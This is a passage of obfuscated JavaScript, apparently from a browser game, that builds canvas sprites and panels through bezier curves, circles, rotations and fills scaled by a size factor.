			Δ.bezierCurveTo(ᐃ * 160.50003051757812, 86.40341186523438 * ᐃ, 160.50003051757812 * ᐃ, ᐃ * 86.40341186523438, ᐃ * 138.00003051757812, ᐃ * 86.40341186523438);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[240], ⵠ[531], ᐃ * ⲆⵠⲆⵠⲆ);
			Δ.save();
			Δ.translate(161.50003051757812 * ᐃ, 117.90341186523438 * ᐃ);
			Ⲇᐃᐃ(Δ, -5.5 * ᐃ, ᐃ * -37.5, 11 * ᐃ, ᐃ * 75, ⵠⲆⲆᐃⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ⵠ[240], ⵠ[531], 10 * ᐃ);
			Δ.save();
			Δ.translate(162.00003051757812 * ᐃ, ᐃ * 78.90341186523438);
			Ⲇᐃᐃ(Δ, ᐃ * -ᐃⵠᐃΔⵠ, -5.5 * ᐃ, ᐃ * 20, ᐃ * 11, ΔⲆᐃᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ⵠ[240]);
			ⵠᐃᐃ(Δ, 161.00003051757812 * ᐃ, ᐃ * 163.6761474609375, 17.08800749063506 * ᐃ);
			ΔⲆ(Δ, ⵠ[240]);
			return Ⲇⵠ
		}

		function ⲆⵠᐃΔΔᐃⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 170 * ᐃ;
			Ⲇⵠ.height = 170 * ᐃ;
			Δ.translate(ΔΔⵠ, ΔΔⵠΔ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃⲆᐃ;
			Δ.save();
			Δ.translate(ᐃ * 85, 95 * ᐃ);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, ⵠⵠⲆⲆⵠ, 60 * ᐃ, ᐃ * ᐃΔⲆᐃⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.globalAlpha = 1;
			Δ.translate(85 * ᐃ, 82 * ᐃ);
			for (var ⵠᐃ = 0; ΔᐃⲆⲆⵠ > ⵠᐃ; ⵠᐃ++) {
				Δ.rotate(Math.PI / 5);
				Δ.save();
				Δ.translate(ᐃ * 65, ⵠⲆᐃⵠ);
				ⵠΔⵠᐃ(Δ, ΔⲆΔᐃ, ᐃ * 21, ᐃ * 4);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[ᐃⲆⵠᐃ], 4 * ᐃ);
				Δ.restore()
			}
			Δ.save();
			Δ.translate(0 * ᐃ, ᐃⵠⲆ * ᐃ);
			Δ.rotate(.2);
			ⵠΔⵠᐃ(Δ, 9, 60 * ᐃ, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆΔⵠᐃ], ⵠᐃᐃⲆ * ᐃ);
			Δ.rotate(-.32);
			ⵠΔⵠᐃ(Δ, ⲆΔⵠᐃΔ, 38 * ᐃ, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[ΔⵠⵠⲆΔ], 4 * ᐃ);
			Δ.rotate(.68);
			ⵠΔⵠᐃ(Δ, ⵠⲆΔⵠⵠ, ᐃ * ᐃᐃⵠⵠⲆ, ᐃ * 8);
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], ᐃ * 6);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⲆΔⵠⵠⲆⵠᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 149;
			Ⲇⵠ.height = 153 * ᐃ;
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 74.5 * ᐃ, 85 * ᐃ, ᐃ * 66);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔⵠΔ;
			ⵠᐃᐃ(Δ, 75.5 * ᐃ, ᐃ * 72.5, 67 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠΔⲆ], ⵠΔΔᐃΔ * ᐃ);
			ⵠᐃᐃ(Δ, 75.5 * ᐃ, ᐃ * 73.5, 54 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ]);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 74.5 * ᐃ, ᐃ * 80.5, ᐃ * 39);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠΔ]);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			ⵠᐃᐃ(Δ, ᐃ * 74.5, 74.5 * ᐃ, 37 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔ]);
			return Ⲇⵠ
		}

		function ⲆⵠΔⲆᐃⵠⵠ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 450;
			Ⲇⵠ.height = ᐃ * 260;
			Δ.translate(ᐃ * ⲆⲆᐃΔΔ, 10 * ᐃ);
			if (ⵠᐃ == 1) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
				Δ.moveTo(ᐃ * ⵠⲆⲆΔᐃ, 5 * ᐃ);
				Δ.bezierCurveTo(381 * ᐃ, ᐃ * ᐃⲆΔⲆ, ᐃ * 197, 4.5 * ᐃ, ᐃ * 385, ⵠᐃᐃⲆ * ᐃ);
				Δ.bezierCurveTo(ᐃ * 397, ᐃ * ⲆⵠᐃⲆ, 401 * ᐃ, ᐃ * 4, ᐃ * 399, 23 * ᐃ);
				Δ.bezierCurveTo(367 * ᐃ, 27 * ᐃ, 367 * ᐃ, ᐃ * 27, 335 * ᐃ, 31 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 366.5, ᐃ * 33.5, ᐃ * 366.5, 33.5 * ᐃ, ᐃ * 398, ᐃ * 36);
				Δ.bezierCurveTo(398 * ᐃ, 41.5 * ᐃ, ᐃ * 398, ᐃ * 41.5, ᐃ * 398, 47 * ᐃ);
				Δ.bezierCurveTo(398 * ᐃ, 56 * ᐃ, 399 * ᐃ, ᐃ * 56, 386 * ᐃ, ᐃ * 56);
				Δ.bezierCurveTo(ᐃ * 200.5, 56.5 * ᐃ, ᐃ * 200.5, ᐃ * 56.5, 15 * ᐃ, 57 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 2, ᐃ * 55, ⲆᐃᐃΔ * ᐃ, 52 * ᐃ, 4 * ᐃ, ᐃ * 43);
				Δ.bezierCurveTo(ⵠⲆⵠᐃ * ᐃ, 30.5 * ᐃ, ᐃ * 4, 30.5 * ᐃ, ᐃ * ΔΔⵠⵠΔ, ⲆⵠⲆᐃΔ * ᐃ);
				Δ.bezierCurveTo(16 * ᐃ, 18.5 * ᐃ, ᐃ * ᐃᐃΔⵠⵠⵠΔ, 18.5 * ᐃ, ᐃ * 28, ⲆᐃⲆⲆⲆΔᐃ * ᐃ);
				Δ.bezierCurveTo(18.5 * ᐃ, ᐃ * ⵠΔᐃΔⵠⲆⵠ, ᐃ * 18.5, ᐃ * 12, ᐃ * ⵠⲆΔⵠⵠ, 5 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ], Ⲇᐃ[ⲆΔⵠⵠ], ᐃ * 32);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(5 * ᐃ, ᐃ * 70);
				Δ.bezierCurveTo(ᐃ * 5, ᐃ * 58, ᐃ * ᐃᐃⲆᐃ, 55 * ᐃ, ᐃ * 17, ᐃ * 57);
				Δ.bezierCurveTo(ᐃ * 203, ᐃ * 57, 203 * ᐃ, 57 * ᐃ, ᐃ * 389, 57 * ᐃ);
				Δ.bezierCurveTo(400 * ᐃ, ᐃ * 57, ᐃ * 400, ᐃ * 59, 400 * ᐃ, 69 * ᐃ);
				Δ.bezierCurveTo(400.5 * ᐃ, ᐃ * 83.5, ᐃ * 400.5, ᐃ * 83.5, ᐃ * 401, 98 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 402, 108 * ᐃ, 401 * ᐃ, ᐃ * 108, 388 * ᐃ, ᐃ * 108);
				Δ.bezierCurveTo(ᐃ * 201.5, 108 * ᐃ, ᐃ * 201.5, 108 * ᐃ, ΔⵠⵠᐃΔᐃⲆ * ᐃ, ᐃ * 108);
				Δ.bezierCurveTo(ᐃ * ᐃⲆᐃ, 106 * ᐃ, ᐃ * 5, 106 * ᐃ, ᐃ * ΔⵠⲆⲆ, ᐃ * 87);
				Δ.bezierCurveTo(33 * ᐃ, ᐃ * 84.5, 33 * ᐃ, ᐃ * 84.5, ᐃ * 61, 82 * ᐃ);
				Δ.bezierCurveTo(33.5 * ᐃ, 76.5 * ᐃ, ᐃ * 33.5, 76.5 * ᐃ, ᐃ * ΔᐃⲆᐃ, 71 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ], Ⲇᐃ[ΔΔᐃΔ], ᐃ * 32);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ⲆⲆⵠᐃⲆΔⲆ * ᐃ, ᐃ * 158);
				Δ.bezierCurveTo(ΔⵠᐃⲆ * ᐃ, ᐃ * 159, ᐃ * ᐃⵠⵠΔ, ᐃ * 156, 5 * ᐃ, ᐃ * 118);
				Δ.bezierCurveTo(ᐃ * 4, 110 * ᐃ, ᐃ * 6, 107 * ᐃ, 26 * ᐃ, 109 * ᐃ);
				Δ.bezierCurveTo(206.5 * ᐃ, 109 * ᐃ, ᐃ * 206.5, 109 * ᐃ, ᐃ * 387, ᐃ * 109);
				Δ.bezierCurveTo(ᐃ * 400, ᐃ * 108, ᐃ * 400, 108 * ᐃ, ᐃ * 398, ᐃ * 127);
				Δ.bezierCurveTo(384.5 * ᐃ, ᐃ * 130, 384.5 * ᐃ, ᐃ * 130, ᐃ * 371, 133 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 385.5, 138 * ᐃ, ᐃ * 385.5, 138 * ᐃ, 400 * ᐃ, ᐃ * 143);
				Δ.bezierCurveTo(ᐃ * 402, ᐃ * 156, 402 * ᐃ, ᐃ * 162, 385 * ᐃ, ᐃ * 160);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[3], ᐃ * 32);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 4, 183 * ᐃ);
				Δ.bezierCurveTo(ⵠᐃⵠΔ * ᐃ, ᐃ * 163, 4 * ᐃ, 158 * ᐃ, 28 * ᐃ, ᐃ * 161);
				Δ.bezierCurveTo(207.5 * ᐃ, ᐃ * 161, ᐃ * 207.5, ᐃ * 161, 387 * ᐃ, ᐃ * 161);
				Δ.bezierCurveTo(ᐃ * 401, 159 * ᐃ, 400 * ᐃ, 164 * ᐃ, 400 * ᐃ, ᐃ * 177);
				Δ.bezierCurveTo(ᐃ * 364.5, ᐃ * 184, 364.5 * ᐃ, ᐃ * 184, ᐃ * 329, 191 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 364.5, ᐃ * 192.5, ᐃ * 364.5, ᐃ * 192.5, ᐃ * 400, ᐃ * 194);
				Δ.bezierCurveTo(403 * ᐃ, ᐃ * 209, ᐃ * 401, 214 * ᐃ, 385 * ᐃ, 213 * ᐃ);
				Δ.bezierCurveTo(201.5 * ᐃ, ᐃ * 213, 201.5 * ᐃ, 213 * ᐃ, ᐃ * ⲆⲆΔⲆⵠᐃᐃ, 213 * ᐃ);
				Δ.bezierCurveTo(ⵠⵠⵠᐃ * ᐃ, 213 * ᐃ, 2 * ᐃ, ᐃ * 213, ᐃ * ⲆⵠΔⵠ, 198 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 12.5, ᐃ * 193, 12.5 * ᐃ, 193 * ᐃ, 21 * ᐃ, 188 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[3], ᐃ * 32);
				ⵠᐃᐃ(Δ, 41 * ᐃ, 30 * ᐃ, 14.7648230602334 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ], Ⲇᐃ[ᐃⵠⲆΔᐃ], ᐃ * 32);
				ⵠᐃᐃ(Δ, ᐃ * 369, ᐃ * 30, 15.556349186104045 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⲆΔⲆ], ᐃ * 32);
				ⵠᐃᐃ(Δ, 364 * ᐃ, ᐃ * 190, ᐃ * 15.620499351813308);
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠᐃⵠⲆ], 32 * ᐃ);
				ⵠᐃᐃ(Δ, 41 * ᐃ, 186 * ᐃ, 15.556349186104045 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ], Ⲇᐃ[ⲆᐃΔᐃ], ᐃ * 32)
			} else 2 == ⵠᐃ && (Δ.beginPath(), Δ.lineCap = ⵠ[ⵠⵠΔⵠ], Δ.lineJoin = ⵠ[ⲆⲆΔⵠ], Δ.moveTo(ᐃ * ⵠⲆⲆΔᐃ, ⵠᐃΔⲆ * ᐃ), Δ.bezierCurveTo(381 * ᐃ, ᐃ * Δᐃⵠⵠ, ᐃ * 197, ᐃ * 4.5, ᐃ * 385, ᐃ * 4), Δ.bezierCurveTo(ᐃ * 397, 4 * ᐃ, ᐃ * 401, 4 * ᐃ, 399 * ᐃ, ᐃ * 23), Δ.bezierCurveTo(367 * ᐃ, ᐃ * 27, ᐃ * 367, ᐃ * 27, 335 * ᐃ, ᐃ * 31), Δ.bezierCurveTo(366.5 * ᐃ, 33.5 * ᐃ, ᐃ * 366.5, 33.5 * ᐃ, ᐃ * 398, ᐃ * 36), Δ.bezierCurveTo(398 * ᐃ, ᐃ * 41.5, ᐃ * 398, ᐃ * 41.5, 398 * ᐃ, 47 * ᐃ), Δ.bezierCurveTo(398 * ᐃ, ᐃ * 56, ᐃ * 399, ᐃ * 56, 386 * ᐃ, ᐃ * 56), Δ.bezierCurveTo(ᐃ * 200.5, ᐃ * 56.5, 200.5 * ᐃ, ᐃ * 56.5, ᐃΔⲆᐃᐃΔᐃ * ᐃ, ᐃ * 57), Δ.bezierCurveTo(ᐃ * Δⵠⵠⵠ, 55 * ᐃ, ᐃ * 4, 52 * ᐃ, ᐃ * ⵠⵠΔᐃΔ, 43 * ᐃ), Δ.bezierCurveTo(ᐃ * ΔⲆᐃⵠᐃ, 30.5 * ᐃ, ᐃ * ⲆΔⵠᐃ, 30.5 * ᐃ, 4 * ᐃ, 18 * ᐃ), Δ.bezierCurveTo(ᐃ * 16, 18.5 * ᐃ, 16 * ᐃ, 18.5 * ᐃ, 28 * ᐃ, ᐃ * ᐃΔⲆΔⵠ), Δ.bezierCurveTo(18.5 * ᐃ, 12 * ᐃ, ᐃ * 18.5, 12 * ᐃ, ᐃ * ⲆⵠⲆⲆⲆ, 5 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ], Ⲇᐃ[ᐃᐃⲆⲆ], 32 * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ], Δ.moveTo(5 * ᐃ, 70 * ᐃ), Δ.bezierCurveTo(ᐃⲆⵠΔ * ᐃ, ᐃ * 58, ᐃΔΔΔ * ᐃ, 55 * ᐃ, ᐃ * 17, ᐃ * 57), Δ.bezierCurveTo(ᐃ * 203, ᐃ * 57, ᐃ * 203, ᐃ * 57, ᐃ * 389, ᐃ * 57), Δ.bezierCurveTo(ᐃ * 400, 57 * ᐃ, ᐃ * 400, ᐃ * 59, 400 * ᐃ, ᐃ * 69), Δ.bezierCurveTo(ᐃ * 400.5, ᐃ * 83.5, ᐃ * 400.5, ᐃ * 83.5, ᐃ * 401, ᐃ * 98), Δ.bezierCurveTo(ᐃ * 402, ᐃ * 108, ᐃ * 401, 108 * ᐃ, ᐃ * 388, ᐃ * 108), Δ.bezierCurveTo(201.5 * ᐃ, ᐃ * 108, ᐃ * 201.5, ᐃ * 108, ᐃ * ΔⵠΔᐃⵠ, ᐃ * 108), Δ.bezierCurveTo(ᐃ * 1, 106 * ᐃ, ⵠⵠΔⵠ * ᐃ, ᐃ * 106, ΔⲆΔΔ * ᐃ, 87 * ᐃ), Δ.bezierCurveTo(ᐃ * 33, 84.5 * ᐃ, 33 * ᐃ, ᐃ * 84.5, 61 * ᐃ, ᐃ * 82), Δ.bezierCurveTo(ᐃ * 33.5, ᐃ * 76.5, 33.5 * ᐃ, ᐃ * 76.5, ᐃ * Δⵠᐃᐃⵠ, 71 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[3], 32 * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ⵠᐃΔⲆ], Δ.lineJoin = ⵠ[ⵠⵠΔⵠ], Δ.moveTo(ᐃ * ⲆⲆΔᐃΔΔⵠ, ᐃ * 158), Δ.bezierCurveTo(ᐃ * 2, 159 * ᐃ, ᐃ * 4, 156 * ᐃ, ᐃ * 5, ᐃ * 118), Δ.bezierCurveTo(ᐃ * ⵠⵠΔᐃΔ, 110 * ᐃ, ᐃ * 6, 107 * ᐃ, ᐃ * 26, ᐃ * 109), Δ.bezierCurveTo(206.5 * ᐃ, 109 * ᐃ, 206.5 * ᐃ, ᐃ * 109, 387 * ᐃ, 109 * ᐃ), Δ.bezierCurveTo(400 * ᐃ, 108 * ᐃ, 400 * ᐃ, ᐃ * 108, 398 * ᐃ, ᐃ * 127), Δ.bezierCurveTo(384.5 * ᐃ, ᐃ * 130, ᐃ * 384.5, 130 * ᐃ, 371 * ᐃ, ᐃ * 133), Δ.bezierCurveTo(ᐃ * 385.5, 138 * ᐃ, 385.5 * ᐃ, ᐃ * 138, 400 * ᐃ, 143 * ᐃ), Δ.bezierCurveTo(402 * ᐃ, ᐃ * 156, 402 * ᐃ, 162 * ᐃ, ᐃ * 385, 160 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ], Ⲇᐃ[ⵠΔΔΔΔ], 32 * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ΔⲆΔΔ], Δ.lineJoin = ⵠ[ⵠᐃⲆΔ], Δ.moveTo(4 * ᐃ, 183 * ᐃ), Δ.bezierCurveTo(ΔⵠΔⵠ * ᐃ, ᐃ * 163, ⲆⵠᐃΔ * ᐃ, ᐃ * 158, ᐃ * 28, ᐃ * 161), Δ.bezierCurveTo(207.5 * ᐃ, ᐃ * 161, ᐃ * 207.5, ᐃ * 161, 387 * ᐃ, ᐃ * 161), Δ.bezierCurveTo(401 * ᐃ, ᐃ * 159, ᐃ * 400, ᐃ * 164, 400 * ᐃ, ᐃ * 177), Δ.bezierCurveTo(364.5 * ᐃ, 184 * ᐃ, ᐃ * 364.5, 184 * ᐃ, 329 * ᐃ, 191 * ᐃ), Δ.bezierCurveTo(364.5 * ᐃ, 192.5 * ᐃ, 364.5 * ᐃ, 192.5 * ᐃ, 400 * ᐃ, 194 * ᐃ), Δ.bezierCurveTo(403 * ᐃ, ᐃ * 209, ᐃ * 401, ᐃ * 214, ᐃ * 385, 213 * ᐃ), Δ.bezierCurveTo(ᐃ * 201.5, ᐃ * 213, 201.5 * ᐃ, 213 * ᐃ, 18 * ᐃ, 213 * ᐃ), Δ.bezierCurveTo(ᐃ * 3, ᐃ * 213, ᐃ * 2, ᐃ * 213, ᐃ * 4, ᐃ * 198), Δ.bezierCurveTo(ᐃ * 12.5, ᐃ * 193, ᐃ * 12.5, ᐃ * 193, 21 * ᐃ, ᐃ * 188), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ᐃⵠⲆΔᐃ], ᐃ * 32), ⵠᐃᐃ(Δ, 41 * ᐃ, 30 * ᐃ, ᐃ * 14.7648230602334), ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], ᐃ * 32), ⵠᐃᐃ(Δ, ᐃ * 369, 30 * ᐃ, ᐃ * 15.556349186104045), ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[ⵠⵠⵠⵠ], 32 * ᐃ), ⵠᐃᐃ(Δ, 364 * ᐃ, 190 * ᐃ, 15.620499351813308 * ᐃ), ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], 32 * ᐃ), ⵠᐃᐃ(Δ, ᐃ * 41, ᐃ * 186, ᐃ * 15.556349186104045), ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔᐃ], Ⲇᐃ[ᐃⲆΔⵠ], 32 * ᐃ));
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(9 * ᐃ, ᐃ * ⵠⲆⵠⵠ);
			Δ.bezierCurveTo(381 * ᐃ, ᐃ * 2, ᐃ * 197, 4.5 * ᐃ, 385 * ᐃ, ΔⲆᐃⵠᐃ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 397, ⵠΔᐃΔ * ᐃ, 401 * ᐃ, ᐃ * 4, 399 * ᐃ, ᐃ * 23);
			Δ.bezierCurveTo(367 * ᐃ, 27 * ᐃ, ᐃ * 367, ᐃ * 27, 335 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(366.5 * ᐃ, ᐃ * 33.5, 366.5 * ᐃ, ᐃ * 33.5, ᐃ * 398, 36 * ᐃ);
			Δ.bezierCurveTo(398 * ᐃ, 41.5 * ᐃ, 398 * ᐃ, 41.5 * ᐃ, ᐃ * 398, ᐃ * 47);
			Δ.bezierCurveTo(398 * ᐃ, 56 * ᐃ, ᐃ * 399, 56 * ᐃ, 386 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 200.5, 56.5 * ᐃ, ᐃ * 200.5, 56.5 * ᐃ, ΔⲆᐃᐃⲆ * ᐃ, 57 * ᐃ);
			Δ.bezierCurveTo(Δᐃⵠⵠ * ᐃ, ᐃ * 55, ⵠᐃᐃⲆ * ᐃ, 52 * ᐃ, ⲆΔⵠᐃ * ᐃ, 43 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 4, 30.5 * ᐃ, Ⲇⵠⵠⵠ * ᐃ, ᐃ * 30.5, ᐃ * 4, 18 * ᐃ);
			Δ.bezierCurveTo(ⵠᐃⲆᐃᐃΔⵠ * ᐃ, 18.5 * ᐃ, ΔⵠᐃᐃⵠⲆⲆ * ᐃ, ᐃ * 18.5, ᐃ * 28, 19 * ᐃ);
			Δ.bezierCurveTo(18.5 * ᐃ, ᐃ * 12, 18.5 * ᐃ, ⵠⵠᐃΔⵠᐃᐃ * ᐃ, ⵠⲆΔⵠⵠ * ᐃ, ᐃ * 5);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇᐃⵠⵠ], ⵠΔᐃΔⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(5 * ᐃ, ᐃ * 70);
			Δ.bezierCurveTo(ᐃᐃⲆᐃ * ᐃ, ᐃ * 58, ᐃ * 5, 55 * ᐃ, ⲆⵠᐃΔᐃ * ᐃ, 57 * ᐃ);
			Δ.bezierCurveTo(203 * ᐃ, 57 * ᐃ, 203 * ᐃ, 57 * ᐃ, ᐃ * 389, 57 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 400, 57 * ᐃ, ᐃ * 400, 59 * ᐃ, 400 * ᐃ, ᐃ * 69);
			Δ.bezierCurveTo(400.5 * ᐃ, 83.5 * ᐃ, 400.5 * ᐃ, ᐃ * 83.5, ᐃ * 401, 98 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 402, 108 * ᐃ, ᐃ * 401, ᐃ * 108, ᐃ * 388, ᐃ * 108);
			Δ.bezierCurveTo(201.5 * ᐃ, ᐃ * 108, 201.5 * ᐃ, ᐃ * 108, ᐃ * 15, ᐃ * 108);
			Δ.bezierCurveTo(ΔΔᐃⵠ * ᐃ, 106 * ᐃ, ⵠᐃΔⵠ * ᐃ, 106 * ᐃ, ᐃ * ΔᐃΔⲆ, ᐃ * 87);
			Δ.bezierCurveTo(33 * ᐃ, 84.5 * ᐃ, ᐃ * 33, 84.5 * ᐃ, 61 * ᐃ, 82 * ᐃ);
			Δ.bezierCurveTo(33.5 * ᐃ, 76.5 * ᐃ, ᐃ * 33.5, 76.5 * ᐃ, ⵠᐃΔⵠⲆ * ᐃ, 71 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ], Ⲇᐃ[0], ⲆΔⲆΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 19, 158 * ᐃ);
			Δ.bezierCurveTo(ᐃⲆΔⲆ * ᐃ, ᐃ * 159, ᐃ * ⵠΔΔᐃΔ, 156 * ᐃ, ᐃ * 5, 118 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⲆΔⵠᐃ, 110 * ᐃ, ᐃ * 6, 107 * ᐃ, 26 * ᐃ, ᐃ * 109);
			Δ.bezierCurveTo(ᐃ * 206.5, ᐃ * 109, ᐃ * 206.5, 109 * ᐃ, 387 * ᐃ, 109 * ᐃ);
			Δ.bezierCurveTo(400 * ᐃ, 108 * ᐃ, 400 * ᐃ, ᐃ * 108, ᐃ * 398, ᐃ * 127);
			Δ.bezierCurveTo(384.5 * ᐃ, 130 * ᐃ, 384.5 * ᐃ, 130 * ᐃ, 371 * ᐃ, 133 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 385.5, ᐃ * 138, 385.5 * ᐃ, ᐃ * 138, ᐃ * 400, 143 * ᐃ);
			Δ.bezierCurveTo(402 * ᐃ, 156 * ᐃ, ᐃ * 402, 162 * ᐃ, ᐃ * 385, ᐃ * 160);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⵠΔ], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * ΔΔⵠⵠΔ, ᐃ * 183);
			Δ.bezierCurveTo(1 * ᐃ, ᐃ * 163, 4 * ᐃ, ᐃ * 158, 28 * ᐃ, 161 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 207.5, 161 * ᐃ, 207.5 * ᐃ, ᐃ * 161, ᐃ * 387, ᐃ * 161);
			Δ.bezierCurveTo(401 * ᐃ, ᐃ * 159, ᐃ * 400, 164 * ᐃ, 400 * ᐃ, ᐃ * 177);
			Δ.bezierCurveTo(364.5 * ᐃ, ᐃ * 184, ᐃ * 364.5, ᐃ * 184, ᐃ * 329, 191 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 364.5, 192.5 * ᐃ, 364.5 * ᐃ, 192.5 * ᐃ, ᐃ * 400, ᐃ * 194);
			Δ.bezierCurveTo(ᐃ * 403, 209 * ᐃ, ᐃ * 401, 214 * ᐃ, ᐃ * 385, 213 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.5, 213 * ᐃ, 201.5 * ᐃ, ᐃ * 213, 18 * ᐃ, ᐃ * 213);
			Δ.bezierCurveTo(ΔⲆᐃⲆ * ᐃ, 213 * ᐃ, ᐃ * ΔⲆΔΔΔ, ᐃ * 213, ⵠΔᐃΔ * ᐃ, 198 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 12.5, ᐃ * 193, ᐃ * 12.5, 193 * ᐃ, 21 * ᐃ, ᐃ * 188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⵠΔ], Ⲇᐃ[0], ΔᐃΔⵠⵠ * ᐃ);
			ⵠᐃᐃ(Δ, 41 * ᐃ, ᐃ * 30, 14.7648230602334 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⲆΔⵠ], ΔᐃⵠⲆⵠ * ᐃ);
			ⵠᐃᐃ(Δ, 369 * ᐃ, 30 * ᐃ, ᐃ * 15.556349186104045);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠΔⲆⵠ], ᐃ * ⵠⲆᐃᐃⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 364, ᐃ * 190, ᐃ * 15.620499351813308);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ], Ⲇᐃ[ⲆⲆⲆᐃ], ᐃ * ⲆΔⲆΔⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 41, ᐃ * 186, 15.556349186104045 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[0], ᐃ * ΔᐃΔⵠⵠ);
